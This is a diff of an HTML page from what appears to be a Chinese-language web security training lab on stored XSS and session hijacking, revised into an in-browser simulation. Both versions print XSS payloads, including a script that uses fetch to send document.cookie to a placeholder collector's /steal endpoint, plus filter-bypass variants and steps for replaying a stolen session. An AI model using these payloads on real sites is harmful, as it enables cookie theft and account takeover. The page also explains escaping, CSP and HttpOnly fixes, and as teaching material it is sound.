@@ -3,77 +3,72 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lab 02 XSS + Session Hijacking | ESAM WEB ATTACK LAB</title>
-<meta name="description" content="Stored XSS 與 Session Hijacking 靶機教學：以惡意留言竊取 cookie 並冒用身分，含可複製 payload。">
+<title>Lab 02 XSS | ESAM Web 攻防 Lab</title>
+<meta name="description" content="Stored XSS 模擬練習：在留言板存入惡意腳本竊取 cookie，含可填入的 payload 與輸出編碼修補。">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
 <nav class="nav">
-  <div class="brand">ESAM<span>//</span>WEB_ATTACK_LAB</div>
+  <div class="brand"><span class="mark">▦</span>ESAM Web 攻防 Lab</div>
   <div class="nav-links">
-    <a href="index.html">Home</a>
-    <a href="lab1-sqli.html">01 SQLi</a>
-    <a href="lab2-xss.html">02 XSS</a>
-    <a href="lab3-ssti.html">03 SSTI</a>
+    <a href="index.html">總覽</a>
+    <a href="lab1-sqli.html">SQL Injection</a>
+    <a href="lab2-xss.html">XSS</a>
+    <a href="lab3-ssti.html">SSTI</a>
   </div>
 </nav>
+<div class="sandbox-bar">課程沙盒 · 所有帳號與資料皆為虛構，僅供授權教學使用</div>
 
 <main class="wrap">
-  <div class="kicker">// LAB 02</div>
-  <h1 class="title">XSS + Session Hijacking</h1>
+  <div class="kicker">Lab 02</div>
+  <h1 class="title">XSS 留言板</h1>
   <p class="lead">留言板把留言內容原封不動輸出到網頁，攻擊者存入的惡意腳本會在每一位瀏覽該留言的使用者端執行，藉此竊取 cookie 並冒用其登入身分。</p>
-  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">PORT 5001 留言板</span> &nbsp; <span class="badge info">PORT 4444 Collector</span></p>
+  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">留言板 + Collector</span></p>
 
   <h2>漏洞原理</h2>
-  <p>留言內容未經編碼即插入 HTML，屬於 <strong>Stored XSS</strong>：惡意腳本存進資料庫後長期存在，之後每一位看到該留言的使用者，瀏覽器都會執行它。靶機並刻意將 cookie 設為 <code>httponly=False</code>，使 JavaScript 能讀取 <code>document.cookie</code>，這是竊取 cookie 的前提。</p>
+  <p>留言內容未經編碼即插入 HTML，屬於 <strong>Stored XSS</strong>：惡意腳本存進資料庫後長期存在，之後每一位看到該留言的使用者，瀏覽器都會執行它。靶機並刻意讓 cookie 可被 JavaScript 讀取（<code>document.cookie</code>），這是竊取 cookie 的前提。腳本讀到 cookie 後，以 <code>fetch</code> 送往攻擊者的 Collector，攻擊者即可用它冒用身分。</p>
 
-  <div class="panel">
-    <span class="tag">兩個網站的角色</span>
-    <table>
-      <tr><th>留言板 (5001)</th><td>學員操作的靶站，可註冊、登入、發留言。內建帳號 <code>admin / admin123!</code>、<code>pony / pony</code></td></tr>
-      <tr><th>Collector (4444)</th><td>攻擊者自架的收集伺服器，<code>/steal?cookie=...</code> 會記下任何送入的 cookie，首頁即可看到何時竊得誰的 cookie</td></tr>
-    </table>
-  </div>
+  <h2>模擬練習</h2>
+  <p class="lead">在下面的留言板發表留言。勾掉 Protected 時為有漏洞狀態；發出含腳本的留言，觀察 Collector 是否收到受害者 cookie。勾選 Protected 後再發一次，比較差異。</p>
 
-  <div class="panel">
-    <span class="tag">攻擊鏈</span>
-    <div class="cmd">
-      <div class="cmd-head"><span>flow</span><button class="copy">Copy</button></div>
-      <pre>受害者開啟留言板(5001) → 看到攻擊者存的惡意留言
-  → 惡意留言的 JavaScript 在「受害者的瀏覽器」執行
-    → 讀取 document.cookie
-      → fetch 送往攻擊者的 Collector(4444)
-        → 攻擊者在 Collector 首頁看到竊得的 cookie</pre>
+  <div class="sim" id="xss-sim">
+    <span class="sim-tag">留言板</span>
+    <h3>留言板</h3>
+    <label for="xss-msg">留言內容</label>
+    <textarea id="xss-msg" spellcheck="false" placeholder="輸入留言或貼上 payload"></textarea>
+    <div class="btn-row">
+      <button class="btn" id="xss-post">發表留言</button>
+      <button class="btn ghost" id="xss-reset">清空</button>
+      <label style="display:flex;align-items:center;gap:6px;margin:14px 0 0;font-weight:600">
+        <input type="checkbox" id="xss-protect"> Protected（輸出編碼）
+      </label>
     </div>
-  </div>
+    <div class="sim-out" id="xss-out"></div>
 
-  <h2>操作步驟</h2>
-  <ol class="steps">
-    <li>
-      <strong>確認漏洞存在。</strong>在留言板發一則下列留言，重新整理後若跳出彈窗，代表腳本被執行。
-      <div class="cmd">
-        <div class="cmd-head"><span>驗證 payload</span><button class="copy">Copy</button></div>
-        <pre>&lt;script&gt;alert("XSS")&lt;/script&gt;</pre>
+    <div class="payload-list">
+      <div class="pl-item">
+        <div><div class="pl-label">1. 驗證有無漏洞</div><div class="pl-code">&lt;script&gt;alert("XSS")&lt;/script&gt;</div></div>
+        <button class="use" data-target="xss-msg" data-value="&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;">填入留言</button>
       </div>
-    </li>
-    <li>
-      <strong>竊取 cookie。</strong>發出下列留言。網址須換成當天 Collector(4444) 的 trycloudflare 網址，不是 localhost，也不是 5001。
-      <div class="cmd">
-        <div class="cmd-head"><span>竊取 cookie payload</span><button class="copy">Copy</button></div>
-        <pre>&lt;script&gt;fetch("https://&lt;Collector_4444網址&gt;/steal?cookie=" + document.cookie)&lt;/script&gt;</pre>
+      <div class="pl-item">
+        <div><div class="pl-label">2. 竊取 cookie 送往 Collector</div><div class="pl-code">&lt;script&gt;fetch("https://&lt;Collector網址&gt;/steal?cookie=" + document.cookie)&lt;/script&gt;</div></div>
+        <button class="use" data-target="xss-msg" data-value='&lt;script&gt;fetch(&quot;https://&lt;Collector網址&gt;/steal?cookie=&quot; + document.cookie)&lt;/script&gt;'>填入留言</button>
       </div>
-    </li>
-    <li><strong>模擬受害者。</strong>以另一組帳號或無痕視窗登入後開啟留言板，再打開 Collector 首頁，確認剛才那位的 cookie 已被收走。</li>
-    <li><strong>Session Hijacking。</strong>把竊得的 <code>session_id</code> 貼進自己瀏覽器的 cookie，重新整理留言板，即以受害者身分登入。此靶機會將偽造的 session 認成對應使用者。</li>
-  </ol>
+      <div class="pl-item">
+        <div><div class="pl-label">3. script 被擋時的變形</div><div class="pl-code">&lt;img src=x onerror=alert('XSS')&gt;</div></div>
+        <button class="use" data-target="xss-msg" data-value="&lt;img src=x onerror=alert('XSS')&gt;">填入留言</button>
+      </div>
+    </div>
 
-  <div class="note warn">
-    <span class="label">script 被過濾時</span>
-    若 <code>&lt;script&gt;</code> 被阻擋，可改用事件觸發或大小寫混寫等變形，說明黑名單過濾無法窮舉：<code>&lt;img src=x onerror=alert('XSS')&gt;</code>、<code>&lt;svg onload=alert('XSS')&gt;</code>、<code>&lt;ScRiPt&gt;...&lt;/ScRiPt&gt;</code>。
+    <h3>留言列表</h3>
+    <div id="xss-board"></div>
+    <h3>攻擊者 Collector</h3>
+    <div id="xss-collector"></div>
+    <div class="sim-note">模擬受害者 cookie：session_id=demo-7f3a9b。所有效果皆為頁面內模擬，不會真的發出請求。</div>
   </div>
 
   <h2>防禦修補</h2>
-  <p>輸出時對使用者內容做 <strong>HTML escape</strong>，使 <code>&lt;script&gt;</code> 以純文字顯示而非執行；搭配 <strong>CSP</strong> 限制可載入的腳本來源；cookie 加上 <strong>HttpOnly</strong>，讓 JavaScript 無法讀取。</p>
+  <p>輸出時對使用者內容做 <strong>HTML escape</strong>，使 <code>&lt;script&gt;</code> 以純文字顯示而非執行（對應上面的 Protected 開關）；搭配 <strong>CSP</strong> 限制可載入的腳本來源；cookie 加上 <strong>HttpOnly</strong>，讓 JavaScript 無法讀取。</p>
 
   <div class="pager">
     <a href="lab1-sqli.html">← Lab 01 SQLi</a>
@@ -82,7 +77,7 @@
   </div>
 </main>
 
-<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 &nbsp;//&nbsp; Web 攻防實戰 Lab</footer>
+<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 · Web 攻防實戰 Lab</footer>
 <script src="app.js"></script>
 </body>
 </html>
